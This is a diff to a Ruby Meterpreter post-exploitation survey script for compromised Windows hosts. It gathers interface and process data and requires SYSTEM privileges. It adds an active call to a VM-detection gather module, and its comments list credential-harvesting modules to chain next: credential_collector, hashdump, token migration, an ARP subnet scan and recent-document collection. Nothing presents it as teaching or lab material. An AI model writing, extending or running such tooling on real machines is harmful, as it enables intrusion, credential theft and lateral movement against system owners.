@@ -25,6 +25,8 @@ def getnetinfo( session )
   num = 1
   print_status("Getting interface information ...")
   interfaces.each do |i|
+  # ARP scan the subnet
+  # run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
     print_status("\tInterface #{num} has IP #{i.addrs[0]} [#{i.netmasks[0]}]")
     num += 1
   end
@@ -52,39 +54,15 @@ def getprocinfo( session )
 end
 
 
-## Script Initialization
-time_stamp  = ::Time.now.strftime('%Y-%m-%d:%H:%M:%S')
-print_status("Survey Initializing #{time_stamp.to_s}")
+# Catchall function for things we haven't done by hand yet
+def runStandalones( session )
 
-# Runs prepared functions
-getinfo( session )
-getnetinfo( session )
-getprocinfo( session )
-
-
-
-time_stamp  = ::Time.now.strftime('%Y-%m-%d:%H:%M:%S')
-print_status("Survey Complete #{time_stamp.to_s}")
-
-#if (session.type == "meterpreter")
-#  uid = session.sys.config.getuid
-  # If we're not system, bail on out
-#  if (uid != "NT AUTHORITY\\SYSTEM")
-#    print_error("Error, must have SYSTEM meterpreter shell")
-#    return
-#  end
-# end
-
-  # Figure out what our IP address is
-  # ARP scan the subnet
-  # run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
-
-  # Harvest the process list
-
-  # Other survey capabilities:
-# run_single("use post/windows/gather/checkvm")
-# run post/windows/gather/checkvm 
+# Check if we're running in a VM
+  run_single("use post/windows/gather/checkvm")
 # run post/windows/gather/credential_collector 
+# run getcountermeasure
+
+# run winenum <-- holy data dump
 
 # run post/windows/manage/migrate
 # run post/windows/gather/dumplinks (<- gets recent docs .lnk files, so we need to be in a user process)
@@ -95,6 +73,35 @@ print_status("Survey Complete #{time_stamp.to_s}")
 # run post/windows/gather/enum_snmp
 # run post/windows/gather/hashdump
 # run post/windows/gather/usb_history
+end
+
+
+## Script Initialization
+time_stamp  = ::Time.now.strftime('%Y-%m-%d:%H:%M:%S')
+print_status("Survey Initializing #{time_stamp.to_s}")
+
+if ( session.sys.config.getuid != "NT AUTHORITY\\SYSTEM")
+  print_error("Error, must have SYSTEM privs")
+  return
+end
+
+# Runs prepared functions
+getinfo( session )
+getnetinfo( session )
+getprocinfo( session )
+
+
+runStandalones( session )
+
+time_stamp  = ::Time.now.strftime('%Y-%m-%d:%H:%M:%S')
+print_status("Survey Complete #{time_stamp.to_s}")
+
+#if (session.type == "meterpreter")
+#  uid = session.sys.config.getuid
+  # If we're not system, bail on out
+# end
+
+
 
 
 
